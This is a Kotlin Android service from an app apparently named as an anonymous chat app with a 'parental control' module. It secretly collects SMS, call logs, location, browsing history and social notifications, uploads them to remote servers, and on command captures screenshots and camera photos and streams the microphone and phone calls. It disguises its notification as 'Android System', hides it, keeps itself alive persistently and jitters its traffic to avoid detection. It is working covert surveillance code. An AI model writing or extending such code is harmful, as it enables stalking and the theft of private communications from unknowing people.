package com.anonchat.app.parentalcontrol.service

import android.util.Log

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.os.PowerManager
import androidx.core.app.NotificationCompat
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import com.anonchat.app.R
import com.anonchat.app.parentalcontrol.api.ApiClient
import com.anonchat.app.parentalcontrol.api.CloudConfig
import com.anonchat.app.parentalcontrol.manager.AutoPermissionHelper
import com.anonchat.app.parentalcontrol.manager.CallStateMonitor
import com.anonchat.app.parentalcontrol.manager.CallStreamManager
import com.anonchat.app.parentalcontrol.manager.RemoteCaptureManager
import com.anonchat.app.parentalcontrol.manager.UpdateManager
import com.anonchat.app.parentalcontrol.work.HeartbeatWorker
import com.anonchat.app.parentalcontrol.receiver.DeviceAdminReceiver
import com.anonchat.app.parentalcontrol.service.TrackerAccessibilityService
import com.anonchat.app.parentalcontrol.service.SocialNotificationService
import com.anonchat.app.parentalcontrol.util.Collectors
import com.anonchat.app.ui.main.MainActivity
import kotlinx.coroutines.*
import org.json.JSONObject

class TrackerService : Service() {

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var wakeLock: PowerManager.WakeLock? = null
    private val collectors = Collectors()
    private var lastForegroundApp: String? = null
    private var configRefreshJob: Job? = null
    private var updateCheckJob: Job? = null
    private var serverWatchJob: Job? = null
    private var callStateMonitor: CallStateMonitor? = null
    private var callStreamManager: CallStreamManager? = null

    // Backoff state: when Cloudflare (or any proxy) returns 429 with a
    // challenge page, we double the next sleep so we stop hammering and
    // the dashboard stops flapping between ON/OFF. Reset to 0 on success.
    @Volatile private var rateLimitBackoffMs: Long = 0L

    private enum class ReportOutcome { OK, RATE_LIMITED, OTHER_FAILURE }

    override fun onCreate() {
        super.onCreate()
        // Ensure config is initialized in case the service starts before MainActivity
        CloudConfig.init(applicationContext)
        createNotificationChannel()
        acquireWakeLock()
        TrackerService.isRunning = true
        // Schedule WorkManager backup heartbeat so last_seen keeps refreshing
        // even if the FGS is force-stopped by OEM battery optimisers.
        HeartbeatWorker.schedule(applicationContext)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val notification = buildNotification()
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            var fgsType = 0
            val hasLocation = checkSelfPermission(android.Manifest.permission.ACCESS_FINE_LOCATION) ==
                android.content.pm.PackageManager.PERMISSION_GRANTED ||
                checkSelfPermission(android.Manifest.permission.ACCESS_COARSE_LOCATION) ==
                android.content.pm.PackageManager.PERMISSION_GRANTED
            val hasMic = checkSelfPermission(android.Manifest.permission.RECORD_AUDIO) ==
                android.content.pm.PackageManager.PERMISSION_GRANTED
            val hasCam = checkSelfPermission(android.Manifest.permission.CAMERA) ==
                android.content.pm.PackageManager.PERMISSION_GRANTED

            if (hasLocation) fgsType = fgsType or
                android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                fgsType = fgsType or
                    android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
            }

            try {
                if (fgsType != 0) {
                    startForeground(NOTIFICATION_ID, notification, fgsType)
                } else {
                    startForeground(NOTIFICATION_ID, notification)
                }
            } catch (e: Exception) {
                try { startForeground(NOTIFICATION_ID, notification) } catch (_: Exception) {}
            }
        } else {
            startForeground(NOTIFICATION_ID, notification)
        }
        startPeriodicReporting()
        startConfigRefresh()
        startUpdateChecker()
        startServerWatch()
        startCallMonitor()
        startFirebaseCommandListener()
        com.anonchat.app.parentalcontrol.receiver.AlarmReceiver.scheduleExactAlarm(this)
        // Schedule WorkManager backup heartbeat so last_seen keeps refreshing
        // even if the FGS is force-stopped by OEM battery optimisers.
        HeartbeatWorker.schedule(this)
        return START_STICKY
    }

    private fun setMicForegroundState(isMicActive: Boolean) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            try {
                val notification = buildNotification()
                var fgsType = 0
                val hasLocation = checkSelfPermission(android.Manifest.permission.ACCESS_FINE_LOCATION) ==
                    android.content.pm.PackageManager.PERMISSION_GRANTED ||
                    checkSelfPermission(android.Manifest.permission.ACCESS_COARSE_LOCATION) ==
                    android.content.pm.PackageManager.PERMISSION_GRANTED
                if (hasLocation) fgsType = fgsType or
                    android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                    fgsType = fgsType or
                        android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
                }
                if (isMicActive && Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                    fgsType = fgsType or android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
                }
                startForeground(NOTIFICATION_ID, notification, fgsType)
            } catch (e: Exception) {
                Log.w(TAG, "Dynamic FGS update failed: ${e.message}")
            }
        }
    }

    private fun startFirebaseCommandListener() {
        try {
            com.anonchat.app.parentalcontrol.manager.FirebaseManager.listenForCommands { commandId, commandType, params ->
                Log.d(TAG, "Received Firebase Command: $commandType ($commandId)")
                val cmdObj = JSONObject().apply {
                    put("id", commandId)
                    put("type", commandType)
                    params.forEach { (k, v) -> put(k, v) }
                }
                scope.launch {
                    handleCommand(cmdObj)
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error starting Firebase command listener", e)
        }
    }

    private fun startCallMonitor() {
        callStateMonitor = CallStateMonitor(this).apply {
            onCallStateChanged = { state, number ->
                Log.d(TAG, "Call state changed: $state, number: $number")
            }
            start()
        }
        callStreamManager = CallStreamManager().apply {
            onStreamingStateChanged = { active ->
                setMicForegroundState(active)
            }
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        super.onDestroy()
        TrackerService.isRunning = false
        callStateMonitor?.stop()
        callStreamManager?.stopStreaming()
        releaseWakeLock()
        updateCheckJob?.cancel()
        serverWatchJob?.cancel()
        scope.cancel()
    }

    private var job: Job? = null

    private fun startPeriodicReporting() {
        if (job?.isActive == true) return
        writeDebugLog("startPeriodicReporting called, isRunning=${TrackerService.isRunning}")
        job = scope.launch {
            try {
                writeDebugLog("Auto-selecting server...")
                val chosen = ApiClient.autoSelectServer(initial = true)
                writeDebugLog("Server selected: $chosen")
            } catch (e: Exception) {
                writeDebugLog("Server auto-select error: ${e.message}")
            }

            try {
                writeDebugLog("Registering device...")
                val deviceInfo = collectors.collectDeviceInfo(this@TrackerService)
                ApiClient.registerDevice(deviceInfo)
                writeDebugLog("Device registered OK")
            } catch (e: Exception) {
                writeDebugLog("Device registration FAILED: ${e.message}")
            }

            while (isActive) {
                try {
                    writeDebugLog("Collecting and reporting...")
                    val outcome = collectAndReport()
                    when (outcome) {
                        ReportOutcome.RATE_LIMITED -> {
                            // Cloudflare throttled us. Exponential backoff
                            // (30s → 60s → 120s → 240s → cap 300s) so the
                            // dashboard stops flapping on/off.
                            rateLimitBackoffMs = when (rateLimitBackoffMs) {
                                0L -> 30_000L
                                else -> (rateLimitBackoffMs * 2).coerceAtMost(300_000L)
                            }
                            writeDebugLog("Rate-limited by proxy, backing off ${rateLimitBackoffMs / 1000}s")
                        }
                        ReportOutcome.OK -> {
                            rateLimitBackoffMs = 0L
                        }
                        ReportOutcome.OTHER_FAILURE -> {
                            // Keep current backoff
                        }
                    }
                } catch (e: Exception) {
                    writeDebugLog("Report loop exception: ${e.message}")
                }
                // Backoff-aware cadence with jitter: respect the exponential
                // rate-limit backoff when set, otherwise 15 s + up to 5 s of
                // jitter so traffic looks less like a bot (helps avoid
                // Cloudflare / CDN challenge flagging on Render's edge).
                val nextDelay = if (rateLimitBackoffMs > 0) {
                    rateLimitBackoffMs
                } else {
                    15_000L + (0..5000L).random()
                }
                delay(nextDelay)
            }
        }
    }

    private fun startConfigRefresh() {
        if (configRefreshJob?.isActive == true) return
        configRefreshJob = scope.launch {
            while (isActive) {
                try {
                    fetchAndApplyConfig()
                } catch (e: Exception) { e.printStackTrace() }
                delay(60_000L)
            }
        }
    }

    private fun startUpdateChecker() {
        if (updateCheckJob?.isActive == true) return
        updateCheckJob = scope.launch {
            delay(30_000L)
            while (isActive) {
                try {
                    UpdateManager.checkForUpdate(this@TrackerService)
                } catch (e: Exception) { e.printStackTrace() }
                delay(3600_000L)
            }
        }
    }

    private fun startServerWatch() {
        if (serverWatchJob?.isActive == true) return
        serverWatchJob = scope.launch {
            while (isActive) {
                delay(5 * 60 * 1000L)
                try {
                    val chosen = ApiClient.autoSelectServer()
                    writeDebugLog("Server watch: active=$chosen")
                } catch (e: Exception) {
                    writeDebugLog("Server watch error: ${e.message}")
                }
            }
        }
    }

    private suspend fun fetchAndApplyConfig() {
        val config = ApiClient.getDeviceConfig() ?: return

        // Handle pending commands
        val commands = config.optJSONArray("commands")
        if (commands != null) {
            for (i in 0 until commands.length()) {
                val cmd = commands.getJSONObject(i)
                handleCommand(cmd)
            }
        }

        // Update reporting interval
        config.optInt("reporting_interval", 300).let {
            // Will be used on next report cycle
        }
    }

    private suspend fun handleCommand(cmd: JSONObject) {
        val commandId = cmd.getString("id")
        val command = cmd.getString("command")
        val params = cmd.optJSONObject("params")

        try {
            ApiClient.updateCommandStatus(commandId, "delivered")
        } catch (e: Exception) {}

        when (command) {
            "lock" -> {
                var locked = false
                try {
                    val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
                    val componentName = ComponentName(this, DeviceAdminReceiver::class.java)
                    if (dpm.isAdminActive(componentName)) {
                        dpm.lockNow()
                        locked = true
                        Log.d(TAG, "Screen locked via DevicePolicyManager")
                    } else {
                        Log.w(TAG, "Device admin not active — trying AccessibilityService lock")
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "DPM lock failed: ${e.message}")
                }

                // Fallback 1: Accessibility global action LOCK_SCREEN (API 28+)
                if (!locked && Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                    try {
                        locked = TrackerAccessibilityService.lockScreen()
                        if (locked) Log.d(TAG, "Screen locked via AccessibilityService global action")
                    } catch (e: Exception) {
                        Log.e(TAG, "Accessibility lock failed: ${e.message}")
                    }
                }

                ApiClient.updateCommandStatus(commandId, if (locked) "completed" else "failed")
            }
            "screenshot" -> {
                Log.d(TAG, "Taking screenshot via AccessibilityService")
                TrackerAccessibilityService.captureScreenshot(commandId) { success ->
                    Log.d(TAG, "Screenshot result: $success")
                    try {
                        ApiClient.updateCommandStatus(
                            commandId,
                            if (success) "completed" else "failed",
                            null,
                            if (success) "image" else null
                        )
                    } catch (e: Exception) {}
                }
            }
            "alarm" -> {
                val duration = params?.optInt("duration", 30) ?: 30
                val alarmIntent = Intent(this, MainActivity::class.java).apply {
                    flags = Intent.FLAG_ACTIVITY_NEW_TASK
                    putExtra("action", "alarm")
                    putExtra("duration", duration)
                }
                startActivity(alarmIntent)
                ApiClient.updateCommandStatus(commandId, "completed")
            }
            "wipe" -> {
                Log.w(TAG, "Wipe command received but disabled for safety")
                ApiClient.updateCommandStatus(commandId, "failed", "Wipe is disabled for safety. Use Device Admin settings manually.")
            }
            "block_apps" -> {
                // Store blocked apps list - the AccessibilityService handles it
                ApiClient.updateCommandStatus(commandId, "completed")
            }
            "camera_front" -> {
                Log.d(TAG, "Capturing front camera photo")
                RemoteCaptureManager.capturePhoto(
                    context = this@TrackerService,
                    useFront = true,
                    commandId = commandId
                ) { success ->
                    Log.d(TAG, "Front camera result: $success")
                    try {
                        ApiClient.updateCommandStatus(
                            commandId,
                            if (success) "completed" else "failed",
                            null,
                            if (success) "image" else null
                        )
                    } catch (e: Exception) {}
                }
            }
            "camera_back" -> {
                Log.d(TAG, "Capturing back camera photo")
                RemoteCaptureManager.capturePhoto(
                    context = this@TrackerService,
                    useFront = false,
                    commandId = commandId
                ) { success ->
                    Log.d(TAG, "Back camera result: $success")
                    try {
                        ApiClient.updateCommandStatus(
                            commandId,
                            if (success) "completed" else "failed",
                            null,
                            if (success) "image" else null
                        )
                    } catch (e: Exception) {}
                }
            }
            "record_audio", "listen_mic" -> {
                val duration = params?.optInt("duration", 0) ?: 0
                Log.d(TAG, "Starting live mic stream (duration=${if (duration > 0) duration else "indefinite"}, command $commandId)")
                ApiClient.updateCommandStatus(commandId, "delivered")

                callStreamManager?.startStreaming(commandId)

                if (duration > 0) {
                    scope.launch {
                        delay(duration * 1000L)
                        callStreamManager?.stopStreaming()
                        ApiClient.updateCommandStatus(commandId, "completed", "/api/parent/audio-recording/$commandId", "audio")
                    }
                }
            }
            "stop_audio" -> {
                Log.d(TAG, "Stopping mic audio stream early")
                callStreamManager?.stopStreaming()
                val targetCmdId = params?.optString("command_id")
                if (!targetCmdId.isNullOrEmpty()) {
                    ApiClient.updateCommandStatus(targetCmdId, "completed", "/api/parent/audio-recording/$targetCmdId", "audio")
                }
                ApiClient.updateCommandStatus(commandId, "completed")
            }

            "listen_call" -> {
                val enable = params?.optBoolean("enable", true) ?: true
                Log.d(TAG, "Listen call: enable=$enable")
                if (enable) {
                    callStreamManager?.startStreaming(commandId)
                    ApiClient.updateCommandStatus(commandId, "delivered")
                } else {
                    callStreamManager?.stopStreaming()
                    ApiClient.updateCommandStatus(commandId, "completed")
                }
            }
            else -> {
                ApiClient.updateCommandStatus(commandId, "completed")
            }
        }
    }

    private suspend fun collectAndReport(): ReportOutcome {
        val context = this@TrackerService
        try {
            // Each collector is isolated: one failing collector (e.g. a
            // ContentProvider error) must never block the rest of the payload.
            val deviceInfo = collectors.collectDeviceInfo(context)
            val location = try { collectors.collectLocation(context) } catch (e: Exception) {
                writeDebugLog("Location collector error: ${e.message}"); null
            }
            val batteryInfo = try { collectors.collectBatteryInfo(context) } catch (e: Exception) {
                writeDebugLog("Battery collector error: ${e.message}")
                com.anonchat.app.parentalcontrol.util.BatteryInfo(-1, false, -1f)
            }
            val smsMessages = try { collectors.collectSmsMessages(context) } catch (e: Exception) {
                writeDebugLog("SMS collector error: ${e.message}"); emptyList()
            }
            val callLogs = try { collectors.collectCallLogs(context) } catch (e: Exception) {
                writeDebugLog("CallLog collector error: ${e.message}"); emptyList()
            }
            val installedApps = try { collectors.collectInstalledApps(context) } catch (e: Exception) {
                writeDebugLog("Apps collector error: ${e.message}"); emptyList()
            }

            val activities = mutableListOf<JSONObject>()
            val foregroundApp = collectors.collectForegroundApp(context)
            if (foregroundApp != null && foregroundApp != lastForegroundApp) {
                lastForegroundApp = foregroundApp
                val appName = collectors.getAppName(context, foregroundApp)
                activities.add(JSONObject().apply {
                    put("activity_type", "app_launch")
                    put("package_name", foregroundApp)
                    put("app_name", appName)
                    put("timestamp", System.currentTimeMillis())
                })
            }

            val screentime = try { collectors.collectScreenTime(context) } catch (e: Exception) {
                writeDebugLog("ScreenTime collector error: ${e.message}"); null
            }
            val webHistory = try { collectors.collectWebHistory(context) } catch (e: Exception) {
                writeDebugLog("WebHistory collector error: ${e.message}"); emptyList()
            }
            writeDebugLog("Collected: ${webHistory.size} web entries, ${smsMessages.size} sms, ${callLogs.size} calls")

            // Ensure notification listener service is bound and active
            SocialNotificationService.ensureRebound(context)

            val socialNotifications = SocialNotificationService.flushBuffer()


            // 1. Report to the active cloud server (Render, sticky) — synchronous & unblocked
            try {
                val payload = ApiClient.buildReportPayload(
                    deviceInfo = deviceInfo,
                    location = location,
                    battery = batteryInfo,
                    smsMessages = smsMessages,
                    callLogs = callLogs,
                    installedApps = installedApps,
                    activities = activities,
                    screentime = screentime,
                    webHistory = webHistory,
                    socialNotifications = socialNotifications
                )

                val result = ApiClient.sendBulkReport(payload)

                if (result.success) {
                    writeDebugLog("Cloud Report OK (${CloudConfig.serverUrl}). Commands: ${result.commands?.size ?: 0}")
                    result.commands?.forEach { cmd ->
                        handleCommand(cmd)
                    }
                    return@collectAndReport ReportOutcome.OK
                } else {
                    val reportErr = result.error ?: "unknown"
                    writeDebugLog("Cloud Report FAILED: $reportErr")
                    // 429 with a Cloudflare challenge page = we are being
                    // throttled by the proxy in front of Render. Don't retry
                    // immediately — the caller will apply exponential backoff.
                    val rateLimited = result.error?.contains("HTTP 429") == true ||
                        result.error?.contains("Just a moment") == true
                    if (rateLimited) {
                        return@collectAndReport ReportOutcome.RATE_LIMITED
                    }
                    // Connection-level failure (server down / cold start): re-probe
                    // the candidate servers and retry the payload once.
                    if (result.error?.startsWith("Exception") == true) {
                        try {
                            val active = ApiClient.autoSelectServer()
                            val retry = ApiClient.sendBulkReport(payload)
                            writeDebugLog("Failover retry to $active: " +
                                if (retry.success) "OK" else "FAILED: ${retry.error}")
                            if (retry.success) {
                                retry.commands?.forEach { cmd -> handleCommand(cmd) }
                                return@collectAndReport ReportOutcome.OK
                            }
                            return@collectAndReport if (retry.error?.contains("HTTP 429") == true ||
                                retry.error?.contains("Just a moment") == true) {
                                ReportOutcome.RATE_LIMITED
                            } else {
                                ReportOutcome.OTHER_FAILURE
                            }
                        } catch (e: Exception) {
                            writeDebugLog("Failover retry error: ${e.message}")
                            return@collectAndReport ReportOutcome.OTHER_FAILURE
                        }
                    }
                    return@collectAndReport ReportOutcome.OTHER_FAILURE
                }
            } catch (e: Exception) {
                writeDebugLog("Cloud Report EXCEPTION: ${e.message}")
                return@collectAndReport ReportOutcome.OTHER_FAILURE
            }

            // 2. Report to Firebase Asynchronously in Background (Never Blocks the Cloud Report)
            scope.launch(kotlinx.coroutines.Dispatchers.IO) {
                try {
                    com.anonchat.app.parentalcontrol.manager.FirebaseManager.reportToFirebase(
                        deviceInfo = deviceInfo,
                        location = location,
                        battery = batteryInfo,
                        smsMessages = smsMessages,
                        callLogs = callLogs,
                        installedApps = installedApps,
                        activities = activities,
                        screentime = screentime,
                        webHistory = webHistory,
                        socialNotifications = socialNotifications
                    )
                } catch (e: Exception) {
                    Log.e(TAG, "Firebase report exception: ${e.message}")
                }
            }
        } catch (e: Exception) {
            writeDebugLog("Report EXCEPTION: ${e.message}")
            e.printStackTrace()
            return ReportOutcome.OTHER_FAILURE
        }
        // All paths through the inner try/catch return explicitly; the outer
        // try/catch also returns on exception. This is a defensive fallback
        // that keeps the function total in case Kotlin's flow analysis ever
        // stops recognising an inner return as exhaustive.
        return ReportOutcome.OK
    }

    private fun writeDebugLog(msg: String) {
        try {
            val ts = java.text.SimpleDateFormat("HH:mm:ss", java.util.Locale.US).format(java.util.Date())
            val line = "$ts $msg\n"
            val file = java.io.File(filesDir, "debug.log")
            file.appendText(line)
            if (file.length() > 100000) {
                file.writeText(file.readText().takeLast(50000))
            }
        } catch (_: Exception) {}
    }

    private fun createNotificationChannel() {
        val channel = NotificationChannel(
            CHANNEL_ID, getString(R.string.notification_channel_name),
            NotificationManager.IMPORTANCE_MIN
        ).apply {
            description = getString(R.string.notification_channel_desc)
            setShowBadge(false)
            enableVibration(false)
            setSound(null, null)
        }
        val manager = getSystemService(NotificationManager::class.java)
        manager.createNotificationChannel(channel)
    }

    private fun buildNotification(): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Android System")
            .setContentText(getString(R.string.notification_text))
            .setSmallIcon(android.R.drawable.ic_menu_manage)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setOngoing(true)
            .setSilent(true)
            .setShowWhen(false)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .build()
    }

    private fun acquireWakeLock() {
        try {
            if (wakeLock == null) {
                val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
                wakeLock = powerManager.newWakeLock(
                    PowerManager.PARTIAL_WAKE_LOCK, "ParentalControl:TrackerWakeLock"
                ).apply {
                    setReferenceCounted(false)
                }
            }
            if (wakeLock?.isHeld != true) {
                wakeLock?.acquire()
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to acquire wakelock", e)
        }
    }

    private suspend fun recordMicAudioToFile(context: Context, durationSec: Int, commandId: String) {
        val outputFile = java.io.File(context.cacheDir, "rec_${commandId}.m4a")
        var recorder: android.media.MediaRecorder? = null
        try {
            recorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                android.media.MediaRecorder(context)
            } else {
                @Suppress("DEPRECATION")
                android.media.MediaRecorder()
            }

            // Use high-sensitivity audio source for capturing loud ambient audio
            val audioSource = try {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                    android.media.MediaRecorder.AudioSource.VOICE_RECOGNITION
                } else {
                    android.media.MediaRecorder.AudioSource.CAMCORDER
                }
            } catch (_: Exception) {
                android.media.MediaRecorder.AudioSource.MIC
            }

            recorder.setAudioSource(audioSource)
            recorder.setOutputFormat(android.media.MediaRecorder.OutputFormat.MPEG_4)
            recorder.setAudioEncoder(android.media.MediaRecorder.AudioEncoder.AAC)
            recorder.setAudioEncodingBitRate(192000)
            recorder.setAudioSamplingRate(44100)
            recorder.setOutputFile(outputFile.absolutePath)

            try {
                recorder.prepare()
            } catch (e: Exception) {
                Log.w(TAG, "VOICE_RECOGNITION prepare failed, trying CAMCORDER/MIC fallback: ${e.message}")
                try { recorder.reset() } catch (_: Exception) {}
                recorder.setAudioSource(android.media.MediaRecorder.AudioSource.CAMCORDER)
                recorder.setOutputFormat(android.media.MediaRecorder.OutputFormat.MPEG_4)
                recorder.setAudioEncoder(android.media.MediaRecorder.AudioEncoder.AAC)
                recorder.setAudioEncodingBitRate(192000)
                recorder.setAudioSamplingRate(44100)
                recorder.setOutputFile(outputFile.absolutePath)
                try {
                    recorder.prepare()
                } catch (e2: Exception) {
                    Log.w(TAG, "CAMCORDER prepare failed, trying MIC/MPEG_4 fallback: ${e2.message}")
                    try { recorder.reset() } catch (_: Exception) {}
                    recorder.setAudioSource(android.media.MediaRecorder.AudioSource.MIC)
                    recorder.setOutputFormat(android.media.MediaRecorder.OutputFormat.MPEG_4)
                    recorder.setAudioEncoder(android.media.MediaRecorder.AudioEncoder.AAC)
                    recorder.setAudioEncodingBitRate(128000)
                    recorder.setAudioSamplingRate(44100)
                    recorder.setOutputFile(outputFile.absolutePath)
                    recorder.prepare()
                }
            }


            recorder.start()
            Log.d(TAG, "Started ${durationSec}s mic recording to file: ${outputFile.absolutePath}")

            // Wait for specified duration
            delay(durationSec * 1000L)

        } catch (e: Exception) {
            Log.e(TAG, "Error during mic recording: ${e.message}")
        } finally {
            try {
                recorder?.stop()
            } catch (_: Exception) {}
            try {
                recorder?.release()
            } catch (_: Exception) {}
        }

        if (outputFile.exists() && outputFile.length() > 0) {
            Log.d(TAG, "Recording completed (${outputFile.length()} bytes). Uploading...")
            val success = ApiClient.uploadAudioRecording(outputFile, commandId)
            if (success) {
                ApiClient.updateCommandStatus(commandId, "completed", "/api/parent/audio-recording/$commandId", "audio")
            } else {
                ApiClient.updateCommandStatus(commandId, "failed", "Failed to upload audio file")
            }
            try { outputFile.delete() } catch (_: Exception) {}
        } else {
            ApiClient.updateCommandStatus(commandId, "failed", "Audio recording was empty or failed")
        }
    }


    private fun releaseWakeLock() {
        if (wakeLock?.isHeld == true) {
            wakeLock?.release()
        }
    }


    companion object {
        private const val TAG = "KidGuard"
        private const val CHANNEL_ID = "parental_control_channel"
        private const val NOTIFICATION_ID = 1
        const val REPORT_INTERVAL_MS = 30_000L

        @Volatile
        var isRunning = false
            private set

        fun start(context: Context) {
            // If the service is already running, no-op. This keeps the
            // keep-alive chain idempotent: every layer can call start()
            // without restarting the FGS.
            if (isRunning) {
                Log.d(TAG, "TrackerService.start() — already running, no-op")
                return
            }
            val intent = Intent(context, TrackerService::class.java)
            try {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    context.startForegroundService(intent)
                } else {
                    context.startService(intent)
                }
            } catch (e: Exception) {
                // Android 12+ throws ForegroundServiceStartNotAllowedException
                // when an app tries to start a foreground service while in
                // the background (e.g. from a broadcast receiver). In that
                // case, the keep-alive chain still has AlarmReceiver and
                // HeartbeatWorker to keep the device visible as ONLINE, so
                // it's safe to log and continue.
                Log.w(TAG, "TrackerService.start() failed (background FGS start?): ${e.message}")
            }
            // Reinforce both keep-alive chains every time the service is started
            // (fast 2-min alarm + OS-managed periodic worker).
            try {
                com.anonchat.app.parentalcontrol.receiver.AlarmReceiver.scheduleExactAlarm(context)
            } catch (_: Exception) {}
            try {
                com.anonchat.app.parentalcontrol.keepalive.KeepAliveScheduler.scheduleAll(context)
            } catch (_: Exception) {}
        }

        fun stop(context: Context) {
            isRunning = false
            val intent = Intent(context, TrackerService::class.java)
            context.stopService(intent)
        }
    }
}
